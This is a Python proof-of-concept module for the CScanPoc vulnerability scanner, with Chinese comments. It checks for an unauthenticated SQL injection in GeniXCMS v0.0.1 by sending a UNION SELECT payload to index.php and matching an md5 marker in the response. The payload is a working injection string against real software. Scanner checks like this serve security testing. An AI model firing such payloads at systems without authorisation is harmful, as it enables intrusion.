# coding: utf-8
import requests

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'GeniXCMS_0101'  # 平台漏洞编号，留空
    name = 'GeniXCMS v0.0.1 /index.php SQL INJECTION'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-18'  # 漏洞公布时间
    desc = '''
    GeniXCMS v0.0.1 Remote Unauthenticated SQL Injection Exploite.
    '''  # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/36321/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'GeniXCMS'  # 漏洞应用名称
    product_version = '0.0.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3214fc19-19a6-495a-97f5-17cbecac18e2'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target
            payload = "/genixcms/index.php?page=1' UNION ALL SELECT 1,2,md5('bb2'),4,5,6,7,8,9,10 and 'j'='j"
            verify_url = url + payload
            content = requests.get(verify_url).text
            if '0c72305dbeb0ed430b79ec9fc5fe8505' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
